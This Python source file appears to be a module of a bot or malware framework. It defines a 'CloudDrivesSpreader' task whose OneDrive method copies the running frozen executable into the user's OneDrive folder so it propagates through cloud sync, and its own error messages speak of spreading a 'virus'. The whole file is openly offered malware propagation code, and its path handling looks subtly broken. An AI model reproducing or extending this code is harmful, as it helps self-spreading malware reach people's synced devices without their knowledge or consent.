from tasks.__task import Task


class MethodOnedrive:
    platforms = ["win32"]
    administrator = {"win32": False}

    def __init__(self):
        super(MethodOnedrive, self).__init__()

    def run(self):
        import os
        import sys
        import shutil
        filename = sys.executable
        target = os.path.join(os.path.expandvars("%OneDrive%"), filename)
        path = shutil.copy(filename, target)
        if path:
            return "Successfully copied to OneDrive cloud drive. Path: {}".format(path)
        else:
            raise Exception("Failed to copy executable to OneDrive disk. Path: {}".format(path))


class CloudDrivesSpreader(Task):
    """Spread via cloud drives."""
    platforms = ["win32", "linux", "darwin"]
    description = __doc__
    administrator = {"win32": False, "linux": True, "darwin": True}

    def __init__(self, task_id):
        super(CloudDrivesSpreader, self).__init__(task_id)
        import logging
        self._logger = logging.getLogger(self.__class__.__name__)
        self.methods = [MethodOnedrive]

    def run(self, **kwargs):
        import sys
        assert getattr(sys, 'frozen', False), "Package not frozen"

        from infos import administrator, platform
        failed = []
        admin = administrator()
        for method in self.methods:
            if any(x == platform() for x in method.platforms):
                if not admin and method.administrator.get(platform()):
                    continue
                try:
                    return method().run()
                except Exception as e:
                    failed.append("Method {} failed: {}".format(method.__name__, e))
        if failed:
            raise Exception("Could not spread virus to cloud drives. All methods failed: {}".format(failed))
        else:
            raise Exception("No available spread method for this bot. "
                            "Platform: {}. Admin rights: {}.".format(platform, admin))
